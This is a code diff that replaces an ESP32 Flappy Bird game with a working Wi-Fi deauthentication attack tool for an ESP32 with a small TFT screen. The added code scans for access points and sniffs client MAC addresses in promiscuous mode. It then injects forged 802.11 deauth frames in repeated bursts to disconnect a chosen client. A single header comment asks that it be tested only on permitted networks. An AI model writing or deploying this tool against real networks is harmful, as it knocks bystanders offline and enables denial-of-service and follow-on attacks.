@@ -1,307 +1,329 @@
-// Flappy Bird ESP32 + ST7735S (160x80)
-// - Nút nhảy: GPIO 23 (đã khai báo)
-// - Menu, High Score lưu bằng Preferences
-// - Sprite chim 2 frame (vỗ cánh)
-// - Partial redraw with proper clear -> no ghosting
+/* ESP32 Deauther (minimal, TFT_eSPI ST7735 160x80)
+   - TFT_eSPI must be configured in User_Setup (pins match your wiring)
+   - Buttons: BTN_SELECT and BTN_ATTACK (change if conflict with TFT pins)
+   - IMPORTANT: test only on your own network or networks you have permission to test.
+*/
 
-#include <Arduino.h>
-#include <TFT_eSPI.h>    // cấu hình chân trong User_Setup.h
-#include <Preferences.h>
+#include <WiFi.h>
+#include "esp_wifi.h"
+#include <TFT_eSPI.h>
 
-#define BUTTON_PIN 23   // nút nhảy ở chân 23 (pull-up)
 TFT_eSPI tft = TFT_eSPI();
-Preferences prefs;
 
-// --- Screen / Game config ---
-const int SCREEN_W = 160;
-const int SCREEN_H = 80;
-const int GROUND_H = 10;
-const int PIPE_W = 20;
-const int GAP_H = 30;
+// ==== Buttons (change if conflict with TFT wiring) ====
+#define BTN_SELECT 5    // chọn mục tiêu (chuyển AP / client)
+#define BTN_ATTACK 23   // nhấn nhanh: tấn công, giữ >1500ms: hủy tấn công
 
-// Thay đổi để tinh chỉnh độ khó:
-float GRAVITY = 0.18f;     // giảm => rơi chậm hơn
-float JUMP_VEL = -2.1f;   // âm => nhảy lên
-int PIPE_SPEED = 2;       // tốc độ ống di chuyển
+// ==== UI layout ====
+#define MAX_AP_SHOW 4
+#define MAX_CLIENTS 20
 
-// Bird
-float birdY = 40.0f;
-float birdVel = 0.0f;
-const int birdX = 30;
-const int BIRD_W = 8;
-const int BIRD_H = 8;
+// ==== Deauth packet (reason code 0x0007) ====
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00, 0x3A, 0x01,
+  0xff,0xff,0xff,0xff,0xff,0xff,   // target (client) -> will overwrite
+  0xff,0xff,0xff,0xff,0xff,0xff,   // source (AP)   -> will overwrite
+  0xff,0xff,0xff,0xff,0xff,0xff,   // BSSID         -> will overwrite
+  0x00,0x00,
+  0x07,0x00
+};
 
-// Pipe
-int pipeX = SCREEN_W;
-int pipeGapY = 30;
+// ==== structures ====
+struct Client {
+  uint8_t mac[6];
+  int rssi;
+  bool used;
+};
 
-// Score
-int score = 0;
-unsigned int highScore = 0;
+Client clients[MAX_CLIENTS];
+volatile int clientCount = 0;
+int currentClient = 0;
 
-// Game state
-enum GameState { STATE_MENU, STATE_PLAY, STATE_SCORE };
-GameState state = STATE_MENU;
-bool gameOver = false;
+// AP scan
+int networksFound = 0;
+int currentAPindex = 0;
 
-// Sprites
-TFT_eSprite sprBirdA = TFT_eSprite(&tft);
-TFT_eSprite sprBirdB = TFT_eSprite(&tft);
-TFT_eSprite sprPipe = TFT_eSprite(&tft);
-TFT_eSprite sprGround = TFT_eSprite(&tft);
+// AP info (selected)
+uint8_t apBSSID[6];
+int apChannel = 1;
 
-// Previous positions (for clearing)
-int prevBirdX = -100, prevBirdY = -100;
-int prevPipeX = -100, prevPipeGapY = -100;
-bool prevGameOver = false;
+bool attacking = false;
+unsigned long lastSelectMillis = 0;
+unsigned long lastAttackMillis = 0;
 
-// Timing
-unsigned long lastFrame = 0;
-const int FRAME_TIME = 30; // ~80 FPS
-int animFrameCounter = 0;
-
-// Debounce
-unsigned long lastBtnTime = 0;
-const unsigned long DEBOUNCE_MS = 120;
-
-// ---------- Helper: safe fillRect that clips to screen ----------
-void fillRectClip(int x, int y, int w, int h, uint16_t color) {
-  if (w <= 0 || h <= 0) return;
-  if (x + w <= 0 || y + h <= 0 || x >= SCREEN_W || y >= SCREEN_H) return;
-  int nx = max(0, x);
-  int ny = max(0, y);
-  int nw = min(SCREEN_W - nx, x + w - nx);
-  int nh = min(SCREEN_H - ny, y + h - ny);
-  tft.fillRect(nx, ny, nw, nh, color);
+void macToStr(const uint8_t *mac, char *out) {
+  sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X",
+          mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
 }
 
-// ---------- Create sprites ----------
-void createBirdSprites() {
-  // Frame A (wings up)
-  sprBirdA.createSprite(BIRD_W, BIRD_H);
-  sprBirdA.fillSprite(TFT_TRANSPARENT);
-  sprBirdA.fillCircle(4, 4, 4, TFT_YELLOW); // thân
-  sprBirdA.fillCircle(2, 3, 1, TFT_BLACK);  // mắt
-  sprBirdA.fillRect(6, 3, 2, 2, TFT_ORANGE); // mỏ
-  sprBirdA.fillRect(1, 0, 6, 2, TFT_YELLOW); // cánh up (simple)
-
-  // Frame B (wings down)
-  sprBirdB.createSprite(BIRD_W, BIRD_H);
-  sprBirdB.fillSprite(TFT_TRANSPARENT);
-  sprBirdB.fillCircle(4, 4, 4, TFT_YELLOW);
-  sprBirdB.fillCircle(2, 3, 1, TFT_BLACK);
-  sprBirdB.fillRect(6, 3, 2, 2, TFT_ORANGE);
-  sprBirdB.fillRect(1, 5, 6, 2, TFT_YELLOW); // cánh down
+void sendDeauthOnce(const uint8_t* client, const uint8_t* ap) {
+  memcpy(&deauthPacket[4], client, 6);
+  memcpy(&deauthPacket[10], ap, 6);
+  memcpy(&deauthPacket[16], ap, 6);
+  // send a small burst (esp_wifi_80211_tx historically may send multiple low-level frames)
+  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
 }
 
-void createPipeSprite() {
-  sprPipe.createSprite(PIPE_W, SCREEN_H);
-  sprPipe.fillSprite(TFT_GREEN);
-  sprPipe.drawRect(0, 0, PIPE_W, SCREEN_H, TFT_DARKGREEN);
-  // small shading stripes
-  for (int y = 0; y < SCREEN_H; y += 6) {
-    sprPipe.drawLine(0, y, PIPE_W-1, y, TFT_DARKGREY);
+void sendDeauthRepeat(const uint8_t* client, const uint8_t* ap, int bursts, int perBurstDelayMs) {
+  for (int b=0; b<bursts; ++b) {
+    sendDeauthOnce(client, ap);
+    delay(perBurstDelayMs);
   }
 }
 
-void createGroundSprite() {
-  sprGround.createSprite(SCREEN_W, GROUND_H);
-  sprGround.fillSprite(TFT_BROWN);
-  for (int i=0;i<SCREEN_W;i+=4) sprGround.fillRect(i, GROUND_H-2, 2, 2, TFT_DARKGREY);
-}
+// ---- promiscuous callback (runs in WiFi context) ----
+// We only capture management frames (probe req, assoc, etc.) and take addr2 (transmitter)
+void sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_MGMT) return; // focus on management frames (client-originated)
+  const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t*)buf;
+  const uint8_t *payload = p->payload;
+  int rssi = p->rx_ctrl.rssi;
 
-// ---------- Reset / Save ----------
-void resetGame() {
-  birdY = SCREEN_H / 2;
-  birdVel = 0;
-  pipeX = SCREEN_W;
-  pipeGapY = random(10, SCREEN_H - GAP_H - GROUND_H - 10);
-  score = 0;
-  gameOver = false;
-  // set prev positions to offscreen to avoid clearing valid areas on first frame
-  prevBirdX = prevBirdY = prevPipeX = prevPipeGapY = -100;
-  prevGameOver = false;
-}
+  // minimal check: need at least 24 bytes header
+  if (p->rx_ctrl.sig_len < 24) return;
 
-void saveHighScore() {
-  if ((unsigned)score > highScore) {
-    highScore = score;
-    prefs.putUInt("high", highScore);
+  // source/transmitter MAC is at offset 10 in management frames header
+  uint8_t clientMac[6];
+  memcpy(clientMac, payload + 10, 6);
+
+  // if same as AP BSSID -> ignore
+  if (memcmp(clientMac, apBSSID, 6) == 0) return;
+
+  // check duplicates
+  for (int i=0;i<clientCount;i++) {
+    if (memcmp(clients[i].mac, clientMac, 6) == 0) return;
+  }
+
+  if (clientCount < MAX_CLIENTS) {
+    memcpy(clients[clientCount].mac, clientMac, 6);
+    clients[clientCount].rssi = rssi;
+    clients[clientCount].used = true;
+    clientCount++;
   }
 }
 
-// ---------- Draw menu / screens ----------
-void drawMenu() {
-  tft.fillScreen(TFT_CYAN);
-  tft.setTextSize(1.5);
-  tft.setTextColor(TFT_BLACK, TFT_CYAN);
-  tft.setCursor(18, 12);
-  tft.print("FLAPPY BIRD");
+// ---- utility: refresh AP scan and show ----
+void scanAndShowAPs() {
+  tft.fillScreen(TFT_BLACK);
   tft.setTextSize(1);
-  tft.setCursor(40, 40);
-  tft.print("Bam nut de choi");
-  tft.setCursor(30, 55);
-  tft.print("Diem cao: ");
-  tft.print(highScore);
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setCursor(0,0);
+
+  networksFound = WiFi.scanNetworks();
+  if (networksFound <= 0) {
+    tft.println("No WiFi found");
+    return;
+  }
+
+  tft.println("Found:");
+  int show = min(networksFound, MAX_AP_SHOW);
+  for (int i=0;i<show;i++) {
+    String ss = WiFi.SSID(i);
+    int r = WiFi.RSSI(i);
+    tft.printf("%d:%s\n", i+1, ss.c_str());
+  }
+  currentAPindex = 0;
 }
 
-void drawScoreScreen() {
-  tft.fillScreen(TFT_CYAN);
-  tft.setTextSize(2);
-  tft.setTextColor(TFT_BLACK, TFT_CYAN);
-  tft.setCursor(25, 18);
-  tft.print("GAME OVER");
+// show selected AP details
+void showSelectedAP() {
+  tft.fillScreen(TFT_BLACK);
   tft.setTextSize(1);
-  tft.setCursor(30, 45);
-  tft.print("Diem: ");
-  tft.print(score);
-  tft.setCursor(30, 58);
-  tft.print("Diem cao: ");
-  tft.print(highScore);
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.setCursor(0,0);
+  tft.printf("AP %d/%d\n", currentAPindex+1, networksFound);
+  String ss = WiFi.SSID(currentAPindex);
+  tft.print("SSID: "); tft.println(ss);
+  tft.printf("RSSI: %d dBm\n", WiFi.RSSI(currentAPindex));
+
+  // show BSSID string
+  char bstr[20];
+  uint8_t *bptr = WiFi.BSSID(currentAPindex); // returns pointer to 6 bytes (Arduino core)
+  if (bptr) {
+    macToStr(bptr, bstr);
+    tft.print("BSSID: "); tft.println(bstr);
+  } else {
+    tft.println("BSSID: N/A");
+  }
+  // channel
+  int ch = WiFi.channel(currentAPindex);
+  tft.printf("Ch: %d\n", ch);
 }
 
-// ---------- Setup ----------
+// start sniffing clients for the selected AP
+void startSniffingForAP() {
+  // get BSSID and channel (use WiFi APIs from scan result)
+  uint8_t *bptr = WiFi.BSSID(currentAPindex);
+  if (!bptr) return;
+  memcpy(apBSSID, bptr, 6);
+  apChannel = WiFi.channel(currentAPindex);
+  if (apChannel <= 0) apChannel = 1;
+
+  // set radio to AP channel before sniff/inject
+  esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
+
+  // clear clients
+  clientCount = 0;
+  currentClient = 0;
+  for (int i=0;i<MAX_CLIENTS;i++) clients[i].used = false;
+
+  // set filter (management frames at least)
+  wifi_promiscuous_filter_t filt;
+  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT; // we focus on mgmt frames (probe/assoc)
+  esp_wifi_set_promiscuous_filter(&filt);
+
+  // set cb and enable promiscuous
+  esp_wifi_set_promiscuous_rx_cb(&sniffer_cb);
+  wifi_promiscuous_enable(true);
+
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setTextColor(TFT_GREEN);
+  tft.setCursor(0,0);
+  tft.println("Sniffing clients...");
+}
+
+// stop sniffing
+void stopSniffing() {
+  wifi_promiscuous_enable(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+}
+
+void showClients() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setCursor(0,0);
+  tft.setTextColor(TFT_CYAN);
+  tft.println("Clients:");
+  int show = min(clientCount, 6); // show up to 6 lines
+  char macs[20];
+  for (int i=0;i<show;i++) {
+    macToStr(clients[i].mac, macs);
+    if (i==currentClient) tft.setTextColor(TFT_YELLOW); else tft.setTextColor(TFT_WHITE);
+    tft.printf("%d:%s %d\n", i+1, macs, clients[i].rssi);
+  }
+  if (clientCount == 0) {
+    tft.setTextColor(TFT_GREEN);
+    tft.println("No clients yet");
+  }
+}
+
 void setup() {
-  pinMode(BUTTON_PIN, INPUT_PULLUP);
   Serial.begin(115200);
+  delay(100);
 
-  prefs.begin("flappy", false);
-  highScore = prefs.getUInt("high", 0);
-
+  // TFT init
   tft.init();
   tft.setRotation(1);
-  randomSeed(analogRead(0));
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setTextColor(TFT_YELLOW);
+  tft.setCursor(0,0);
+  tft.println("Deauther boot");
 
-  createBirdSprites();
-  createPipeSprite();
-  createGroundSprite();
+  // buttons
+  pinMode(BTN_SELECT, INPUT_PULLUP);
+  pinMode(BTN_ATTACK, INPUT_PULLUP);
 
-  drawMenu();
+  // WiFi
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(true, true); // clear
+  delay(200);
+
+  tft.println("Scanning...");
+  delay(200);
+  scanAndShowAPs();
+  if (networksFound > 0) showSelectedAP();
 }
 
-// ---------- Main Loop ----------
 void loop() {
-  unsigned long now = millis();
-  if (now - lastFrame < FRAME_TIME) return; // frame cap
-  lastFrame = now;
-  animFrameCounter++;
+  // ===== SELECT button: short press cycles targets =====
+  if (digitalRead(BTN_SELECT) == LOW) {
+    if (millis() - lastSelectMillis > 250) {
+      lastSelectMillis = millis();
+      // if currently not sniffing clients (clientCount==0) => cycle AP
+      if (clientCount == 0) {
+        if (networksFound == 0) {
+          scanAndShowAPs();
+          return;
+        }
+        currentAPindex = (currentAPindex + 1) % networksFound;
+        showSelectedAP();
 
-  // Read button with debounce
-  bool btn = false;
-  if (digitalRead(BUTTON_PIN) == LOW) {
-    if (millis() - lastBtnTime > DEBOUNCE_MS) {
-      btn = true;
-      lastBtnTime = millis();
+        // start sniffing clients for this AP
+        startSniffingForAP();
+        delay(300); // give some time to collect
+        showClients();
+      } else {
+        // if we already have a client list -> cycle through clients
+        if (clientCount > 0) {
+          currentClient = (currentClient + 1) % clientCount;
+          showClients();
+        }
+      }
+    }
+    // simple debounce
+    while(digitalRead(BTN_SELECT) == LOW) delay(10);
+  }
+
+  // ===== ATTACK button: short press start attack; hold >1500ms to stop =====
+  if (digitalRead(BTN_ATTACK) == LOW) {
+    unsigned long t0 = millis();
+    // wait until button released or timeout
+    while (digitalRead(BTN_ATTACK) == LOW) {
+      if (!attacking && (millis() - t0 > 50)) break; // short press detected
+      if (attacking && (millis() - t0 > 1500)) {
+        // long hold during attack -> stop
+        attacking = false;
+        stopSniffing();
+        scanAndShowAPs();
+        if (networksFound>0) showSelectedAP();
+        return;
+      }
+      delay(10);
+    }
+
+    // If we are not attacking yet -> start attack on currentClient
+    if (!attacking && clientCount > 0) {
+      attacking = true;
+      // ensure on AP channel
+      esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
+      tft.fillScreen(TFT_BLACK);
+      tft.setCursor(0,0); tft.setTextColor(TFT_RED);
+      char mstr[20]; macToStr(clients[currentClient].mac, mstr);
+      tft.print("ATTACK -> "); tft.println(mstr);
+      // do not block here forever; toggle attacking flag to stop.
+    }
+    // small debounce
+    delay(150);
+  }
+
+  // ===== While attacking: send bursts, but check if user requested stop =====
+  if (attacking && clientCount > 0) {
+    // send short bursts (non-blocking-ish)
+    sendDeauthRepeat(clients[currentClient].mac, apBSSID, 3, 10); // 3 sends with 10ms gap
+    delay(50); // throttle loop
+
+    // check if attack button held now to stop (press+hold)
+    if (digitalRead(BTN_ATTACK) == LOW) {
+      unsigned long t1 = millis();
+      while (digitalRead(BTN_ATTACK) == LOW) {
+        if (millis() - t1 > 1500) {
+          attacking = false;
+          stopSniffing();
+          scanAndShowAPs();
+          if (networksFound > 0) showSelectedAP();
+          return;
+        }
+        delay(10);
+      }
     }
   }
 
-  // State handling
-  if (state == STATE_MENU) {
-    if (btn) {
-      resetGame();
-      state = STATE_PLAY;
-      // draw initial background for game
-      tft.fillScreen(TFT_CYAN);
-      sprGround.pushSprite(0, SCREEN_H - GROUND_H);
-    }
-    return;
+  // periodically refresh client list view
+  static unsigned long lastRefresh = 0;
+  if (millis() - lastRefresh > 2000) {
+    lastRefresh = millis();
+    if (clientCount > 0 && !attacking) showClients();
   }
-
-  if (state == STATE_SCORE) {
-    if (btn) {
-      drawMenu();
-      state = STATE_MENU;
-    }
-    return;
-  }
-
-  // ----- GAME PLAY -----
-  if (btn && !gameOver) {
-    birdVel = JUMP_VEL;
-  }
-
-  if (!gameOver) {
-    birdVel += GRAVITY;
-    birdY += birdVel;
-
-    pipeX -= PIPE_SPEED;
-    if (pipeX < -PIPE_W) {
-      pipeX = SCREEN_W;
-      pipeGapY = random(10, SCREEN_H - GAP_H - GROUND_H - 10);
-      score++;
-    }
-
-    // collision check
-    if (birdY <= 0 || birdY + BIRD_H >= SCREEN_H - GROUND_H ||
-        (birdX + BIRD_W > pipeX && birdX < pipeX + PIPE_W &&
-         (birdY < pipeGapY || birdY + BIRD_H > pipeGapY + GAP_H))) {
-      gameOver = true;
-      saveHighScore();
-    }
-  } else {
-    // when dead, press once to go score screen
-    if (btn) {
-      drawScoreScreen();
-      state = STATE_SCORE;
-    }
-  }
-
-  // ---------- Clear old regions (critical to prevent ghosting) ----------
-  // Clear previous bird
-  fillRectClip(prevBirdX, prevBirdY, BIRD_W, BIRD_H, TFT_CYAN);
-  // Clear previous pipe top
-  if (prevPipeX > -100) {
-    fillRectClip(prevPipeX, 0, PIPE_W, prevPipeGapY, TFT_CYAN);
-    // Clear previous pipe bottom
-    int bottomH = SCREEN_H - (prevPipeGapY + GAP_H + GROUND_H);
-    if (bottomH > 0)
-      fillRectClip(prevPipeX, prevPipeGapY + GAP_H, PIPE_W, bottomH, TFT_CYAN);
-  }
-  // Clear previous game over box if existed
-  if (prevGameOver) {
-    fillRectClip(30, 30, 100, 20, TFT_CYAN);
-  }
-  // Clear score area (top-left)
-  fillRectClip(0, 0, 60, 10, TFT_CYAN);
-
-  // ---------- Draw new objects ----------
-  // Draw pipe top
-  sprPipe.pushSprite(pipeX, 0, 0, 0, PIPE_W, pipeGapY);
-  // Draw pipe bottom
-  int bottomY = pipeGapY + GAP_H;
-  int bottomH = SCREEN_H - (pipeGapY + GAP_H + GROUND_H);
-  if (bottomH > 0) sprPipe.pushSprite(pipeX, bottomY, 0, bottomY, PIPE_W, bottomH);
-
-  // Bird animation: alternate frames every few ticks
-  if ((animFrameCounter / 4) % 2 == 0) {
-    sprBirdA.pushSprite(birdX, (int)birdY, TFT_TRANSPARENT);
-  } else {
-    sprBirdB.pushSprite(birdX, (int)birdY, TFT_TRANSPARENT);
-  }
-
-  // Ground (always at bottom)
-  sprGround.pushSprite(0, SCREEN_H - GROUND_H);
-
-  // Score text
-  tft.setTextSize(1);
-  tft.setTextColor(TFT_BLACK, TFT_CYAN);
-  tft.setCursor(5, 2);
-  tft.print("Score: ");
-  tft.print(score);
-
-  // Game over box (draw if gameOver)
-  if (gameOver) {
-    tft.fillRect(30, 30, 100, 20, TFT_WHITE);
-    tft.drawRect(30, 30, 100, 20, TFT_BLACK);
-    tft.setCursor(42, 37);
-    tft.setTextColor(TFT_BLACK, TFT_WHITE);
-    tft.print("GAME OVER");
-  }
-
-  // ---------- Save current positions for next frame clearing ----------
-  prevBirdX = birdX;
-  prevBirdY = (int)birdY;
-  prevPipeX = pipeX;
-  prevPipeGapY = pipeGapY;
-  prevGameOver = gameOver;
 }
